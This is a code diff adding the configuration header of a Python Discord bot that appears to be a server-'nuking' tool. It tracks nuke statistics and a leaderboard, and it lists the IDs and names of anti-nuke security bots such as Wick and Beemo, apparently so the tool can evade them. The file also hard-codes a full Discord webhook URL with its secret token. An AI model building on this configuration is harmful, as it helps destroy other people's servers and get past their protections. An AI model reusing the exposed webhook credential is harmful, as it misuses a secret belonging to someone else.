@@ -1,0 +1,34 @@
+import discord
+
+intents = discord.Intents.all()
+
+leaderboard_message = None
+NUKE_STATS_FILE = "nuke_stats.json"
+PREMIUM_FILE = "data/premium.json"
+CONFIG_FILE = "config.json"
+PREM = 1414916058875301939
+MOD_ROLE_ID = 1414916058120192051
+WHITELIST = [
+    1340433509130436618,
+    941326582096744469,
+    1195644166105997315
+]
+BLACKLISTED_GUILD_ID = 1418550612085440554
+OWNER_ID = 1340433509130436618
+LEADERBOARD_CHANNEL_ID = 1401931021544460389
+TOKEN = ''
+LOG_WEBHOOK_URL = ''
+
+BLOCKED_BOT_IDS = [
+    651095740390834176,
+    548410451818708993,
+]
+
+BLOCKED_BOT_NAMES = [
+    "Security",
+    "Wick",
+    "Beemo",
+    "AntiNuke",
+]
+
+leave_hook = "https://ptb.discord.com/api/webhooks/1404434190828703744/97hc9pbvw-ecqN5idWiTdjC6oLUHzoDllzFUwmGIwpgmSsYV8_2PUR3ILhsmXNySv5GW"
